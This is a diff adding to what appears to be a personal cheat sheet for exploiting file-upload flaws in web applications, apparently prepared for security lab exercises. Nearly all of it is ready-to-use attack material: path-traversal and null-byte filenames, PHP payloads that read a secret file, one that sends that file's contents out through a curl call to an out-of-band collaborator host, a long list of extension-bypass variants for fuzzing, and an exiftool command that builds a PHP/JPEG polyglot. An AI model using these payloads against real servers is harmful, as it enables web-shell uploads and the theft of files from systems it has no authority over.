@@ -1,4 +1,50 @@
+#!/usr/bin/peno
+#Extension:
+
+
 filename="../exploit.php"
 filename="..%2fexploit.php"
 filename="hi.php%00.jpg"
+
+
+#Exploit-Payload
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+<?php system('curl $(cat /home/carlos/secret).seaepqj8xtjbx8hbbz71kbz6oxuoie63.oastify.com'); ?>
+
+
+#Intruder(Some useful extensions):
+
+.php
+.jsp
+.php5
+.shtml
+.php.jpg
+.php5.jpg
+%2Ephp
+%2Ephp.jpg
+%2Ephp%2Ejpg
+.asp%00.jpg
+.php%00.jpg
+.p.phphp
+.jpg.php
+xC0x2Ephp
+xC4xAEphp
+xC0xAEphp
+x2Ephp
+xC0x2Ephp.jpg
+xC4xAEphp.jpg
+xC0xAEphp.jpg
+x2Ephp.jpg
+xC0x2Ephp
+xC4xAEphp
+xC0xAEphp
+x2Ephp
+..%2fexploit.php
+..%2f..%2fexploit.php
+.htaccess
+
+
+#Tools-Command
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
 
